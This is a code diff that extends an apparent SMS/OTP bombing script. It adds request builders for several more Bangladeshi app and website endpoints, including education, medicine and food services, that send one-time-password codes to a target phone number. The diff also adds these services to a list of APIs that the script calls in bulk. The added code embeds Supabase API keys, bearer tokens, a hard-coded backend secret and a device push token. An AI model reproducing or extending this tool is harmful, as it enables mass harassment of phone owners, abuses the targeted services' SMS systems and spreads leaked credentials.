@@ -383,6 +383,34 @@ def build_request(api, phone):
             url = 'https://app-neo.goldkinen.com/api/v2/auth/request-otp/'
             body = json.dumps({"phone": pr, "scope": "REGISTRATION", "is_resend": False})
             h.update({'authorization': 'Bearer', 'version-code': '4.2.9', 'User-Agent': 'gk-app'})
+        elif api == 'acs':
+            url = 'https://auth.acsfutureschool.com/api/v1/otp/send'
+            body = json.dumps({"phone": pr})
+            h['Origin'] = 'https://auth.acsfutureschool.com'
+        elif api == 'protty':
+            url = 'https://srxnoaacjobsmjpbaypb.supabase.co/functions/v1/send_otp'
+            body = json.dumps({"phoneNumber": pp, "purpose": "login"})
+            h.update({'apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNyeG5vYWFjam9ic21qcGJheXBiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MzgwMDU4NDYsImV4cCI6MjA1MzU4MTg0Nn0.OUNc0B3tAbYNvMzliwFu-Ikjhn6wzMUzwc57SsphIyY', 'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNyeG5vYWFjam9ic21qcGJheXBiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MzgwMDU4NDYsImV4cCI6MjA1MzU4MTg0Nn0.OUNc0B3tAbYNvMzliwFu-Ikjhn6wzMUzwc57SsphIyY', 'x-supabase-client-platform': 'android', 'x-client-info': 'supabase-flutter/2.12.0', 'User-Agent': 'Dart/3.11 (dart:io)'})
+        elif api == 'onlineminabazar':
+            url = 'https://onlinemedicinebazar.com/api/tenant/omb/api/customer-auth/otp/request'
+            body = json.dumps({"channel": "mobile", "mobile": pr})
+            h['Origin'] = 'https://onlinemedicinebazar.com'; h['X-Requested-With'] = 'com.onlinemedicinebazar.app'
+        elif api == 'qualityfoods':
+            url = 'https://admin.qualityfoods.com.bd/api/auth/check-phone'
+            body = json.dumps({"login_type": "phone", "phone": pr, "is_sign_in": 0})
+            h = {'Content-Type': 'application/json; charset=utf-8', 'Accept': 'application/json', 'User-Agent': 'Dart/3.10 (dart:io)'}
+        elif api == 'shikkhasohay':
+            url = 'https://server.shikkhasohay.com/api/v1/auth/register-otp'
+            body = json.dumps({"phone_number": pr})
+            h.update({'x-client-type': 'mobile', 'x-client-platform': 'react-native', 'x-app-version': '1.2.7', 'x-device-os': 'android', 'x-device-name': 'Infinix X665B', 'x-fcm-token': 'cbss3ZzFRlyd3db36oHBLq:APA91bFLVbRq5FN5QYQKuwHlQHoOLqmKbKICs5kM_q9t9tB1zN3Z4AMov-q6TdSittcIIFBNECf1ryPamdhULBdGOtr1mT7k3n8ZPnVGspxPGo8iIsfoJT4', 'User-Agent': 'okhttp/4.12.0'})
+        elif api == 'teacherbd':
+            url = 'https://teachersbd.com/verify-otp'
+            body = f"phone={pr}&context=register"
+            h = {'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8', 'Accept': '*/*', 'User-Agent': 'Dart/3.9 (dart:io)', 'x-api-key': 'teacher_bd_backend_secret_key_12345', 'authorization': 'Bearer null'}
+        elif api == 'vokta':
+            url = 'https://dncrp.com/otp/create'
+            body = json.dumps({"phoneNumber": pr})
+            h['Origin'] = 'https://dncrp.com'; h['X-Requested-With'] = 'com.ccv4huvi.bazardorv6'; h['Referer'] = 'https://dncrp.com/'
     except Exception:
         return None
     return {'url': url, 'body': body, 'headers': h, 'method': method}
@@ -400,7 +428,8 @@ APIS = [
     'carrybee_verify','carrybee_register','eziclick','livemcq','timezonebd','shaddho',
     'udvash','amarbay','rhombus','toffee','apcom','ieducation','brritto','edgecourse',
     'shopbase','jamakapor','quizbd','shukhee','smartsohay','shikhosms','walifier',
-    'bdtickets','guardian','goldkinen'
+    'bdtickets','guardian','goldkinen','acs','protty','onlineminabazar',
+    'qualityfoods','shikkhasohay','teacherbd','vokta'
 ]
 
 async def call_api(session, api, phone):
